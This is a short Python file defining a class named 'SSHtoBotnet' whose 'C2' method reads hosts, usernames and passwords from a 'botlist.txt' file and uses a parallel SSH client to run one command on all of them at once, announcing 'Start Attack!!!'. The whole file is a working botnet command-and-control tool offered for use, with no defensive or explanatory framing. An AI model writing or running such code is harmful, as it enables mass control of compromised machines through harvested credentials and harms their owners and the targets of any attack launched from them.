from pssh.clients import ParallelSSHClient
from pssh.config import HostConfig

class SSHtoBotnet:
    def C2(command):
        hosts = []
        config = []
        for client in open('botlist.txt','r').readlines():
            result = client.split("$")
            print(result[0])
            hosts.append(str(result[0]))
            config.append(HostConfig(user=str(result[1]), password=str(result[2])))

        client = ParallelSSHClient(hosts,host_config=config)

        print("Start Attack!!!")
        client.run_command(command)

